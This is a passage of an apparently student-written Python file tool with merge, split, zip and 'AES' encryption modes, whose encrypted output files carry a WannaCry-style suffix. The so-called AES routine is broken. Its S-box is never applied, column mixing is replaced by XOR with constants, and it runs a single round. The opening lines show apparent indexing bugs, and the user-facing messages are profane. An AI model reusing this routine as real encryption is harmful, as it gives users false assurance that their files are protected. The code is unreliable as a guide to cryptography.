	with open(data[:len(data)-8]+'R','rb') as E:
		fr = E.read()
		fr = str.rstrip(str(fr))
	with open(data[len(data)-8]+'R','w') as E:
		E.write(fr)
def _EN_AES_(data):

	S1 = {
		'0':'63','1':'7c','2':'77','3':'7b','4':'f2','5':'6b','6':'6f','7':'c5','8':'30','9':'01','a':'67','b':'2b','c':'fe','d':'d7','e':'ab','f':'76',
		'10':'ca','11':'82','12':'c9','13':'7d','14':'fa','15':'59','16':'47','17':'f0','18':'ad','19':'d4','1a':'a2','1b':'af','1c':'9c','1d':'a4','1e':'72','1f':'c0',
		'20':'b7','21':'fd','22':'93','23':'26','24':'36','25':'3f','26':'f7','27':'cc','28':'34','29':'a5','2a':'e5','2b':'f1','2c':'71','2d':'d8','2e':'31','2f':'15',
		'30':'04','31':'c7','32':'23','33':'c3','34':'18','35':'96','36':'05','37':'9a','38':'07','39':'12','3a':'80','3b':'e2','3c':'eb','3d':'27','3e':'b2','3f':'75',
		'40':'09','41':'83','42':'2c','43':'1a','44':'1b','45':'6e','46':'5a','47':'a0','48':'52','49':'3b','4a':'d6','4b':'b3','4c':'29','4d':'e3','4e':'2f','4f':'84',
		'50':'53','51':'d1','52':'00','53':'ed','54':'20','55':'fc','56':'b1','57':'5b','58':'6a','59':'cb','5a':'be','5b':'39','5c':'4a','5d':'4c','5e':'58','5f':'cf',
		'60':'d0','61':'ef','62':'aa','63':'fb','64':'43','65':'4d','66':'33','67':'85','68':'45','69':'f9','6a':'02','6b':'7f','6c':'50','6d':'3c','6e':'9f','6f':'a8',
		'70':'51','71':'a3','72':'40','73':'8f','74':'92','75':'9d','76':'38','77':'f5','78':'bc','79':'b6','7a':'da','7b':'21','7c':'10','7d':'ff','7e':'f3','7f':'d2',
		'80':'cd','81':'0c','82':'13','83':'ec','84':'5f','85':'97','86':'44','87':'17','88':'c4','89':'a7','8a':'7e','8b':'3d','8c':'64','8d':'5d','8e':'19','8f':'73',
		'90':'60','91':'81','92':'4f','93':'dc','94':'22','95':'2a','96':'90','97':'88','98':'46','99':'ee','9a':'b8','9b':'14','9c':'de','9d':'5e','9e':'0b','9f':'db',
		'a0':'e0','a1':'32','a2':'3a','a3':'0a','a4':'49','a5':'06','a6':'24','a7':'5c','a8':'c2','a9':'d3','aa':'ac','ab':'62','ac':'91','ad':'95','ae':'e4','af':'79',
		'b0':'e7','b1':'c8','b2':'37','b3':'6d','b4':'8d','b5':'d5','b6':'4e','b7':'a9','b8':'6c','b9':'56','ba':'f4','bb':'ea','bc':'65','bd':'7a','be':'ae','bf':'08',
		'c0':'ba','c1':'78','c2':'25','c3':'2e','c4':'1c','c5':'a6','c6':'b4','c7':'c6','c8':'e8','c9':'dd','ca':'74','cb':'1f','cc':'4b','cd':'bd','ce':'8b','cf':'8a',
		'd0':'70','d1':'3e','d2':'b5','d3':'66','d4':'48','d5':'03','d6':'f6','d7':'0e','d8':'61','d9':'35','da':'57','db':'b9','dc':'86','dd':'c1','de':'1d','df':'9e',
		'e0':'e1','e1':'f8','e2':'98','e3':'11','e4':'69','e5':'d9','e6':'8e','e7':'94','e8':'9b','e9':'1e','ea':'87','eb':'e9','ec':'ce','ed':'55','ee':'28','ef':'df',
		'f0':'8c','f1':'a1','f2':'89','f3':'0d','f4':'bf','f5':'e6','f6':'42','f7':'68','f8':'41','f9':'99','fa':'2d','fb':'0f','fc':'b0','fd':'54','fe':'bb','ff':'16'
	}
	aa = [0,0,0,0]
	ab = [0,0,0,0]
	ac = [0,0,0,0]
	ad = [0,0,0,0]
	ka = [0,0,0,0]
	kb = [0,0,0,0]
	kc = [0,0,0,0]
	kd = [0,0,0,0]
	b1 = [0,0,0,0]
	b2 = [0,0,0,0]
	b3 = [0,0,0,0]
	b4 = [0,0,0,0]
	I = '';J = '';M = '';L = ''
	E = open(data+'WANNACRY','wb')
	with open(data,'rb') as f:
		fr = f.read()
	if len(fr)/16 != float(len(fr)//16):
		with open(data,'a') as f:
			f.write(' '*int(16-(len(fr)-(len(fr)//16)*16)))
	with open(data,'rb') as f:
		with open('KEY.txt','rb') as K:
			fr = f.read()
			f.seek(0,0)
			for k in range((len(fr)//16)):
				K.seek(0,0)
				for i in range(16):
					b = ord(struct.pack('c',f.read(1)))
					if i <= 3:
						aa[i] = b 
					elif 3 < i <= 7:
						ab[i-4] = b
					elif 7 < i <=11:
						ac[i - 8] = b 
					elif i > 11:
						ad[i-12] = b
				for j in range(16):
					b = ord(struct.pack('c',K.read(1)))
					if j <= 3:
						ka[j] = b
					elif 3 < j <= 7:
						kb[j-4] = b
					elif 7 < j <=11:
						kc[j - 8] = b
					elif j > 11:
						kd[j-12] = b
				for i in range(16):
					if i <= 3:
						b1[i] = aa[i]^ka[i]
					elif 3 < i <= 7:
						b2[i-4] = ab[i-4]^kb[i-4]
					elif 7 < i <=11:
						b3[i-8] = ac[i-8]^kc[i-8]
					elif i > 11:
						b4[i-12] = ad[i-12]^kd[i-12]	
					
				I = b2[0]
				J = b2[1]
				M = b2[2]
				L = b2[3]
				
				b2[0] = J
				b2[1] = M
				b2[2] = L
				b2[3] = I
				
				I = b3[0]
				J = b3[1]
				M = b3[2]
				L = b3[3]
				
				b3[0] = M
				b3[1] = L
				b3[2] = I
				b3[3] = J
				
				I = b4[0]
				J = b4[1]
				M = b4[2]
				L = b4[3]
				
				b4[0] = L
				b4[1] = I
				b4[2] = J
				b4[3] = M	
				
				b1[0] = b1[0] ^ int('02',16)
				b2[0] = b2[0] ^ int('03',16)
				b3[0] = b3[0] ^ int('01',16)
				b4[0] = b4[0] ^ int('01',16)
				
				b1[1] = b1[1] ^ int('01',16)
				b2[1] = b2[1] ^ int('02',16)
				b3[1] = b3[1] ^ int('03',16)
				b4[1] = b4[1] ^ int('01',16)
				
				b1[2] = b1[2] ^ int('01',16)
				b2[2] = b2[2] ^ int('01',16)
				b3[2] = b3[2] ^ int('02',16)
				b4[2] = b4[2] ^ int('03',16) 
				
				b1[3] = b1[3] ^ int('03',16)
				b2[3] = b2[3] ^ int('01',16)
				b3[3] = b3[3] ^ int('01',16)
				b4[3] = b4[3] ^ int('02',16)
				
				for i in range(4):
					E.write(struct.pack('B',b1[i]))
				for i in range(4):
					E.write(struct.pack('B',b2[i]))
				for i in range(4):
					E.write(struct.pack('B',b3[i]))
				for i in range(4):
					E.write(struct.pack('B',b4[i]))	
				if int(((k+1)/(len(fr)/16))*100) != int(((k+2)/(len(fr)/16))*100):
					print(str(int(((k+1)/(len(fr)/16))*100)+1) + '%')
def _KEYRAN_(data):
	with open('KEY.txt','wb') as K:
		K.write(os.urandom(256))	
if __FUNCTION__ == '-m':
	OutputFile = open(InputParameter2_OutputFilePath,'wb')
	__Merge__(InputParameter1_InputFilePath,InputParameter2_OutputFilePath)
	OutputFile.close()
elif __FUNCTION__ == '-d':
	__Dismantling__(InputParameter1_InputFilePath,InputParameter2_OutputFilePath)
elif __FUNCTION__ == '-z':
	__Zip__(InputParameter1_InputFilePath,os.path.getsize(InputParameter1_InputFilePath))
elif __FUNCTION__ == '-u':
	__UnZip__(InputParameter1_InputFilePath,os.path.getsize(InputParameter1_InputFilePath))
elif __FUNCTION__ == '-help':
	print('DEAL WITH IT BY YOURSELF!')
elif __FUNCTION__ == '-a':				
	_EN_AES_(InputParameter1_InputFilePath)
elif __FUNCTION__ == '-x':
	_DN_AES_(InputParameter1_InputFilePath)
elif __FUNCTION__ == '-k':
	_KEYRAN_(0)
elif __FUNCTION__ == '-X':
	__Merge_ENAES__(InputParameter1_InputFilePath,'1')
else:
	print('Plz Enter the F**king Damn Bloody Function! Lil\' F**ker! Move Ur Ass NOW!')
	
#	Copyright2017 Anarchy Massacre, Stu. Kevin Y. Wong. All rights reserved. All rights are reserved.